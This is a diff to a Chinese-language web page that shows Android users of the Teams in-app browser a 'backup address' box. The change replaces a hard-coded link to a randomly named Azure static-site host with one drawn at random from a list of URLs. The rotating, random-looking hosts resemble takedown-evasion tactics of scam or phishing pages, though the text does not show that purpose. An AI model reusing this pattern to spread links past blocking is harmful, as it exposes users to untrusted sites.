@@ -89,7 +89,7 @@
 <div id="alt">
   <h1>您的手机暂时不支持</h1>
   <p>请到应用商店下载 EDGE 浏览器访问</p>
-  <a href="https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html" target="_blank">备用地址</a>
+  <a id="alt-link" href="#" target="_blank">备用地址</a>
 </div>
 
 <script>
@@ -106,7 +106,8 @@
 
   // 安卓端 Teams 内部浏览器兼容问题提示
   if (isAndroid && isTeams) {
-    showAlt();
+    const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+    showAlt(randomUrl);
     return;
   }
 
@@ -130,9 +131,14 @@ function showError() {
   document.getElementById("err").style.display = "block";
 }
 
-function showAlt() {
+function showAlt(url) {
   document.getElementById("bar").style.display = "none";
   document.getElementById("alt").style.display = "block";
+  if (url) {
+    const link = document.getElementById("alt-link");
+    link.href = url;
+    link.textContent = url;
+  }
 }
 
 function retry() {
